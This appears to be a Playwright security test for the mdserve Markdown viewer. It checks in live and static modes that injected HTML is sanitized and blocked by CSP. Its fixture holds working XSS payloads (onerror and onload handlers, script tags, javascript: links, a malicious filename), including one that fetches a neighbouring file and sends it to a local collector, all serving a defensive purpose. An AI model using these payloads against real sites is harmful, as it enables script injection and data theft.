const {chromium}=require('playwright');
const assert=require('node:assert/strict');
const {spawn,execFileSync}=require('node:child_process');
const fs=require('node:fs');
const os=require('node:os');
const path=require('node:path');
const http=require('node:http');
const {pathToFileURL}=require('node:url');
(async()=>{
 const repo=path.resolve(__dirname,'../..'), tmp=fs.mkdtempSync(path.join(os.tmpdir(),'mdserve-sanitize-'));
 const docs=path.join(tmp,'docs'),out=path.join(tmp,'site'),binary=path.join(tmp,'mdserve');
 fs.mkdirSync(docs);let browser,live;const servers=[],failures=[],leaks=[];
 const check=async(name,fn)=>{try{await fn();console.log('PASS '+name);}catch(e){failures.push(name+': '+e.message);console.error('FAIL '+name+': '+e.message);}};
 try {
 const collector=http.createServer((req,res)=>{leaks.push(req.url);res.end('ok');});servers.push(collector);
 await new Promise(r=>collector.listen(0,'127.0.0.1',r));
 const attack=`window.__executed=true;fetch('/raw?path=neighbor.md').then(r=>r.text()).then(s=>fetch('http://127.0.0.1:${collector.address().port}/collect?data='+encodeURIComponent(s)))`;
 const attr=attack.replaceAll('&','&amp;').replaceAll('"','&quot;');
 const malicious=`# Security fixture\n\n<img src="missing.png" onerror="${attr}">\n\n<svg onload="${attr}"><script>window.__executed=true</script></svg>\n\n<iframe srcdoc="<script>parent.__executed=true</script>"></iframe>\n\n[bad](javascript:window.__executed=true)\n\n<a href="jav&#x61;script:window.__executed=true">encoded bad</a>\n\n<object data="data:text/html,<script>window.__executed=true</script>"></object>\n\n<form id="page"><input name="MDSERVE"></form>\n\n<style>body{display:none}</style>\n\n<script>${attack}</script>\n\n\`\`\`mermaid\n%%{init: {'securityLevel':'loose'}}%%\ngraph LR\n A[Start] --> B[End]\n click A call alert()\n\`\`\`\n`;
 fs.writeFileSync(path.join(docs,'active.html'),'<script>window.__assetExecuted=true</script>');
 fs.writeFileSync(path.join(docs,'evil.md'),malicious);fs.writeFileSync(path.join(docs,'neighbor.md'),'# DUMMY_NEIGHBOR_TOKEN');
 const filename='<img src=x onerror="window.__executed=true">';fs.mkdirSync(path.join(docs,filename));fs.writeFileSync(path.join(docs,filename,'safe.md'),'# Filename fixture');
 fs.cpSync(path.join(__dirname,'fixtures'),docs,{recursive:true});
 fs.appendFileSync(path.join(docs,'README.md'),'\nاستانداردسازی زیرساخت‌های بین‌المللی — می‌شود <bdi dir="ltr">+98 21 9123 4567</bdi>\n');
 execFileSync('go',['build','-o',binary,'.'],{cwd:repo,env:{...process.env,GOCACHE:'/private/tmp/mdserve-go-cache'}});
 execFileSync(binary,['build','--dir',docs,'--out',out]);
 assert.equal(fs.existsSync(path.join(out,'active.html')),false,'unrelated active HTML must not export');
 live=spawn(binary,['serve','--dir',docs,'--addr','127.0.0.1:0','--no-update-check']);
 const liveURL=await new Promise((resolve,reject)=>{let s='';const timer=setTimeout(()=>reject(Error('startup timeout')),10000);live.stdout.on('data',b=>{s+=b;const m=s.match(/http:\/\/[^\s]+\//);if(m){clearTimeout(timer);resolve(m[0]);}});live.on('exit',c=>reject(Error('startup exit '+c)));});
 const staticServer=http.createServer((req,res)=>{const p=path.join(out,decodeURIComponent(new URL(req.url,'http://local').pathname));try{const b=fs.readFileSync(p);res.setHeader('Content-Type',p.endsWith('.js')?'text/javascript':p.endsWith('.css')?'text/css':p.endsWith('.svg')?'image/svg+xml':p.endsWith('.html')?'text/html':'application/octet-stream');res.end(b);}catch{res.writeHead(404);res.end();}});servers.push(staticServer);await new Promise(r=>staticServer.listen(0,'127.0.0.1',r));
 const staticURL=`http://127.0.0.1:${staticServer.address().port}/`;
 browser=await chromium.launch(process.env.MDSERVE_CHROME?{executablePath:process.env.MDSERVE_CHROME}:{});
 browser.on('context',c=>c.setDefaultTimeout(5000));
 console.log('Browser '+browser.version());
 for(const mode of ['live','static']) {
 await check(mode+' sanitization independent of CSP',async()=>{
 const page=await browser.newPage();page.on('dialog',d=>d.dismiss());
 // Remove CSP only in this test to prove sanitization supplies the protection.
 await page.route('**/*',async route=>{if(route.request().resourceType()!=='document'){return route.continue();}const response=await route.fetch();const headers={...response.headers()};delete headers['content-security-policy'];let body=await response.text();body=body.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/gi,'');await route.fulfill({response,headers,body});});
 await page.goto(mode==='live'?liveURL+'#evil.md':staticURL+'evil.md.html');
 await page.waitForSelector('#page h1',{state:'attached'});await page.waitForTimeout(500);
 const result=await page.evaluate(()=>({ran:!!window.__executed,bad:[...document.querySelectorAll('#page *')].filter(e=>/^(script|iframe|object|embed|style|form|svg)$/i.test(e.tagName)&&!e.closest('.mermaid')).map(e=>e.tagName),handlers:[...document.querySelectorAll('#page *')].flatMap(e=>[...e.attributes].filter(a=>/^on/i.test(a.name)).map(a=>a.name)),urls:[...document.querySelectorAll('#page [href]')].map(e=>e.getAttribute('href')).filter(v=>/^\s*(javascript|vbscript|data):/i.test(v))}));
 await page.close();console.log(mode+' payload results '+JSON.stringify({...result,transmissions:leaks.length}));assert.equal(result.ran,false);assert.deepEqual(result.bad,[]);assert.deepEqual(result.handlers,[]);assert.deepEqual(result.urls,[]);assert.equal(leaks.length,0,'dummy neighbor exfiltration');
 });
 await check(mode+' filename injection',async()=>{const page=await browser.newPage();await page.goto(mode==='live'?liveURL+'#'+encodeURIComponent(filename+'/safe.md'):staticURL+encodeURIComponent(filename)+'/safe.md.html');await page.waitForSelector('#page h1');await page.waitForTimeout(150);assert.equal(await page.evaluate(()=>!!window.__executed),false);if(mode==='live'){assert.equal(await page.locator('#crumb img').count(),0);assert.ok((await page.locator('#crumb').textContent()).includes(filename));}await page.close();});
 await check(mode+' feature compatibility',async()=>{
 const page=await browser.newPage();const external=[];page.on('request',r=>{if(!r.url().startsWith(mode==='live'?liveURL:staticURL))external.push(r.url());});
 await page.goto(mode==='live'?liveURL:staticURL+'README.md.html');
 await page.waitForSelector('#page .mermaid svg');await page.waitForSelector('#page .katex');
 for(const selector of ['h1','table','input[type=checkbox]','pre code .hljs-string','strong','em','del'])assert.ok(await page.locator('#page '+selector).count(),selector);
 assert.equal(await page.locator('#page img').evaluate(e=>e.complete&&e.naturalWidth>0),true);
 assert.equal(await page.locator('#page bdi').evaluate(e=>getComputedStyle(e).direction),'ltr');
 assert.equal(await page.locator('#page p').last().evaluate(e=>getComputedStyle(e).direction),'rtl');
 assert.equal(await page.locator('#page pre').evaluate(e=>getComputedStyle(e).direction),'ltr');
 assert.equal(external.length,0,'unexpected remote requests');
 await page.screenshot({path:path.join(tmp,mode+'-root.png'),fullPage:true});
 if(mode==='live') {for(let i=0;i<3;i++){await page.locator('#b-theme').click();assert.ok(['dark','warm','light'].includes(await page.locator('body').getAttribute('data-theme')));}await page.locator('#page a').filter({hasText:'nested document'}).click();await page.waitForFunction(()=>document.querySelector('#page h1')?.textContent.includes('Nested document'));}
 if(mode==='static'){await page.locator('#page a').filter({hasText:'nested document'}).click();await page.waitForSelector('#page h1');assert.equal(await page.locator('#page h1').textContent(),'Nested document');}
 await page.screenshot({path:path.join(tmp,mode+'.png'),fullPage:true});await page.close();
 });
 }
 for(const mode of ['live','static']) {
 await check(mode+' CSP enforcement',async()=>{
 const page=await browser.newPage();await page.goto(mode==='live'?liveURL:staticURL+'README.md.html');await page.waitForSelector('#page h1');
 await page.evaluate(()=>{window.__violations=[];document.addEventListener('securitypolicyviolation',e=>window.__violations.push(e.effectiveDirective));const s=document.createElement('script');s.textContent='window.__cspExecuted=true';document.body.appendChild(s);const img=document.createElement('img');img.setAttribute('onerror','window.__cspExecuted=true');img.src='/missing-csp.png';document.body.appendChild(img);});
 await page.waitForFunction(()=>window.__violations.length>=2);
 assert.equal(await page.evaluate(()=>!!window.__cspExecuted),false);
 await page.close();
 });
 }
 await check('live standalone asset execution blocked',async()=>{
 const page=await browser.newPage();await page.goto(liveURL+'file?path=active.html');await page.waitForTimeout(150);assert.equal(await page.evaluate(()=>!!window.__assetExecuted),false);await page.close();
 });
 await check('live reload stays sanitized',async()=>{
 const page=await browser.newPage();const original=fs.readFileSync(path.join(docs,'README.md'),'utf8');
 try{await page.goto(liveURL);await page.waitForSelector('#page h1');fs.writeFileSync(path.join(docs,'README.md'),malicious);
 await page.waitForFunction(()=>document.querySelector('#page h1')?.textContent==='Security fixture');
 await page.waitForTimeout(150);assert.equal(await page.evaluate(()=>!!window.__executed),false);
 assert.equal(await page.locator('#page [onerror],#page iframe,#page script').count(),0);assert.equal(leaks.length,0);
 }finally{fs.writeFileSync(path.join(docs,'README.md'),original);await page.close();}
 });
 await check('static file:// offline rendering',async()=>{const page=await browser.newPage();await page.goto(pathToFileURL(path.join(out,'README.md.html')).href);await page.waitForSelector('#page .mermaid svg');await page.waitForSelector('#page .katex');assert.equal(await page.locator('#page img').evaluate(e=>e.complete&&e.naturalWidth>0),true);await page.close();});
 console.log('Artifacts '+tmp);
 if(process.env.MDSERVE_KEEP_ARTIFACTS) console.log('Retaining dummy fixtures/screenshots');
 if(failures.length)throw Error(failures.join('\n'));
 }finally{if(live)live.kill();servers.forEach(s=>s.close());if(browser)await browser.close();if(!process.env.MDSERVE_KEEP_ARTIFACTS)fs.rmSync(tmp,{recursive:true,force:true});}
})().catch(e=>{console.error(e);process.exitCode=1});
